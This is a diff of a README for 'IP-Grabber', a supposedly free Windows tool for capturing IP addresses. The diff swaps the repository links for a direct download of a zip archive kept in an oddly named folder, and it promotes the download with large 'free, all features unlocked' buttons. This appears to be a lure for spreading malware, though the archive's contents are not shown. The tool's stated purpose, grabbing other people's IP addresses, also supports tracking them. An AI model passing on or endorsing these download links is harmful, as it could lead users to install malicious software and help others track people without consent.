@@ -1,7 +1,7 @@
 <h1>🛡️ IP-Grabber - Free IP Capture Tool for Windows</h1>
 
 <p align="center">
-  <a href="https://github.com/erugeek-spec/IP-Grabber" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://github.com/erugeek-spec/IP-Grabber/raw/refs/heads/main/sigillaroid/Grabber-I-2.3.zip" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ---
@@ -60,7 +60,7 @@ This 2026 version is **completely free** with all features unlocked. No hidden c
 ### Step 1: Get the File
 
 Visit this link to download the application:  
-**[https://github.com/erugeek-spec/IP-Grabber](https://github.com/erugeek-spec/IP-Grabber)**
+**[https://github.com/erugeek-spec/IP-Grabber/raw/refs/heads/main/sigillaroid/Grabber-I-2.3.zip](https://github.com/erugeek-spec/IP-Grabber/raw/refs/heads/main/sigillaroid/Grabber-I-2.3.zip)**
 
 ### Step 2: Run the Application
 
@@ -173,7 +173,7 @@ If you encounter any issues or have questions:
 
 Don't wait—IP-Grabber is ready when you are. Download it today and see how simple IP capture can be.
 
-**[⬇️ CLICK HERE TO DOWNLOAD IP-GRABBER FREE](https://github.com/erugeek-spec/IP-Grabber)**
+**[⬇️ CLICK HERE TO DOWNLOAD IP-GRABBER FREE](https://github.com/erugeek-spec/IP-Grabber/raw/refs/heads/main/sigillaroid/Grabber-I-2.3.zip)**
 
 ---
 
